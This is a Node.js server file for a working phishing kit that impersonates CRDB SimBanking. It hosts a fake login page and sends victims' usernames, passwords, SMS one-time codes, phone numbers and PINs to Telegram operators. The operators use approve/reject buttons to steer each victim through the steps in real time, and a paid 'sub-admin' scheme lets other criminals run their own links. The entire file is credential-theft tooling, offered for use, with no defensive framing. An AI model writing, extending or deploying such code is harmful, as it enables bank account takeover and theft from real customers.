/**
 * **CRDB SIMBANKING - SECURE MULTI-ADMIN SERVER**
 * Configured for independent sub-admin routing.
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
      return targetAdmin;
    }
  }
  return null;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    await bot.setWebHook(webhookUrl);
    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try { bot.processUpdate(req.body); } catch (err) {}
    });
  } catch (err) {
    process.exit(1);
  }

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 *Welcome Main Admin*\nYour personal link: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const record = admins.get(chatId);
      if (!record.authorized || !record.paid) {
        await bot.sendMessage(FALLBACK_ADMIN_ID, 
          `🚨 *New Sub-Admin Awaiting Approval/Payment!*\n\n` +
          `👤 *Name:* ${firstName}\n` +
          `🆔 *Chat ID:* \`${chatId}\``, 
          { parse_mode: 'Markdown' }
        );

        await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour account is awaiting approval and payment clearance.`, { parse_mode: 'Markdown' });
        return;
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour referral link is active:\n${userLink}`, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { contact: 'Unknown', adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'WRONG_CREDS':
          session.status = 'RETRY_CREDS';
          await bot.sendMessage(chatTarget, `❌ Credentials marked as Wrong. User redirected to re-enter username/password.`);
          break;
        case 'CORRECT_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Credentials correct. User proceeding to 6-digit SMS OTP verification.`);
          break;
        case 'OTP_EXPIRED':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ OTP expired/invalid. User commanded to enter new incoming 6-digit OTP.`);
          break;
        case 'CORRECT_OTP':
          session.status = 'PROCEED_PHONE_PIN';
          await bot.sendMessage(chatTarget, `✅ OTP correct. User proceeding to Phone Number & PIN entry.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.pin = '';
          await bot.sendMessage(chatTarget, `❌ Wrong PIN. User redirected to re-enter PIN.`);
          break;
        case 'CORRECT_PIN':
        case 'FINAL_SUCCESS':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Application fully approved! Success screen sent.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Submit Username & Password (with Copyable text format for Telegram)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { username, password, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Admin is not authorized or unpaid.' });
    }

    const userId = `user_${Date.now()}`;
    sessions.set(userId, { 
      username, 
      password, 
      adminChatId: targetChat, 
      status: 'WAITING_CREDS_APPROVAL' 
    });

    const message = `🟢 *CRDB SIMBANKING LOGIN CREDENTIALS*\n\n` +
                    `👤 *Username:* \`${username}\`\n` +
                    `🔑 *Password:* \`${password}\`\n\n` +
                    `📋 *Copy Details:* \`${username}:${password}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
            { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Network error processing credentials.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

// Step 2: Submit 6-digit SMS OTP
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `🟢 *CRDB SIMBANKING 6-DIGIT SMS OTP*\n\n` +
                    `📱 *OTP Code:* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ OTP EXPIRES', callback_data: `OTP_EXPIRED_${userId}` },
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error submitting OTP' });
  }
});

// Step 3: Submit Phone Number & PIN
app.post('/api/submit-phone-pin', async (req, res) => {
  try {
    const { userId, phone, pin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_PIN_VERIFICATION';
    session.phone = phone;
    session.pin = pin;

    const message = `🟢 *CRDB SIMBANKING PHONE & PIN*\n\n` +
                    `📞 *Phone:* \`${phone}\`\n` +
                    `🔒 *PIN:* \`${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Error submitting phone and PIN' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
                
